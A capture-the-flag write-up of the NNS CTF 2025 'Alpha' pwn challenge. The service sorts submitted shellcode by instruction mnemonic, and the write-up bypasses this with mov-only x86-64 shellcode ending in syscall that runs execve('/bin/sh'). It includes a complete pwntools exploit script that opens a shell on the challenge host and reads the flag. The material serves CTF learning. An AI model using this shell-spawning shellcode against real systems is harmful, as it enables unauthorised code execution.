# Alpha – NNS CTF 2025 (PWN)

## Challenge description

> _"I read online that aligning your shellcode is really important."_

We’re given a Python service that:

1. Reads user-provided shellcode as hex.
2. Disassembles it with Capstone.
3. Sorts the instructions alphabetically by mnemonic.
4. Reassembles and executes it.

## Vulnerable code
```python
shellcode = bytes.fromhex(input(">> "))

sorted_shellcode = b"".join(
    bytes(i.bytes) for i in sorted(
        list(md.disasm(shellcode, 0)),
        key=lambda i: i.mnemonic or ""
    )
)

with process(make_elf(sorted_shellcode, extract=False), stdin=0) as p:
    p.interactive()
```
- Any normal shellcode is destroyed since instructions are reordered.
- But the sorting is **stable**: instructions with the same mnemonic keep their relative order.

## Exploitation idea

We can bypass the “ugly shellcode sorter” by crafting shellcode where reordering doesn’t matter.

Key trick:
- Use only one mnemonic (`mov`) for all setup instructions.
- Sorting preserves the order of those `mov`s.
- Add a final `syscall` instruction (which sorts after `mov`).

Steps:
1. Write the string `"/bin/sh\x00"` onto the stack with `mov dword [rsp+off], imm32`.
2. Set registers with `mov`:
    - `rdi = rsp` (string pointer)
    - `rsi = 0`, `rdx = 0`, `rax = 59` (execve).
3. End with `syscall`.

Result: `execve("/bin/sh", 0, 0)` runs successfully.

## Exploit

We generate this “alignment-proof” shellcode, send it as hex, and then read the flag automatically:
```python
from pwn import *

context.update(arch="amd64", os="linux")

HOST = "082c0f5c-629a-4c52-8a2e-f29823c2db2b.chall.nnsc.tf"
PORT = 41337

def build_shellcode():
    return asm("""
        mov dword ptr [rsp], 0x6e69622f     ; "/bin"
        mov dword ptr [rsp+4], 0x0068732f   ; "/sh\\0"

        mov rdi, rsp
        mov esi, 0
        mov edx, 0
        mov eax, 59

        syscall
    """)

def main():
    sc = build_shellcode()
    hex_payload = sc.hex()

    io = remote(HOST, PORT, ssl=True, sni=HOST)
    io.recvuntil(b">> ")
    io.sendline(hex_payload.encode())

    # Spawn shell, grab flag
    io.sendline(b"cat flag.txt")
    flag = io.recvuntil(b"}", timeout=5).decode(errors="ignore").strip()
    print(f"[+] Flag: {flag}")

if __name__ == "__main__":
    main()
```
